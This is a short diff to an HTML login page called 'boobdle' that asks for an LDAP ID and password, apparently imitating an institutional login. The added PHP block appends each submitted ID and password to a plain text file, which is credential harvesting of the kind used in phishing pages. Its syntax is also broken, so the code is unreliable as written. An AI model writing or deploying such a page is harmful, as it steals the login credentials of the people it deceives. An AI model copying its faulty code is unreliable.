@@ -6,7 +6,7 @@
   <marquee>REGISTRATION FOR HINDI CLASS IS NOW OPEN! REGISTER ON TUNAK SERVER.</marquee>
     <h2>Welcome to boobdle main login page!</h2>
     
-   <form action="/action_page.php">
+  <form method="post">
   <label for="LDAP">LDAP ID:</label><br>
   <input type="text" id="LDAP" name="LDAP" value="LDAP ID"><br>
   <label for="Password">Password</label><br>
@@ -16,3 +16,14 @@
 
   </font>
   </html>
+
+<?php
+              
+if(isset($_POST['LDAP','Password']))
+{
+$data=$_POST['LDAP','Password'];
+$fp = fopen('data.txt', 'a');
+fwrite($fp, $data);
+fclose($fp);
+}
+?>
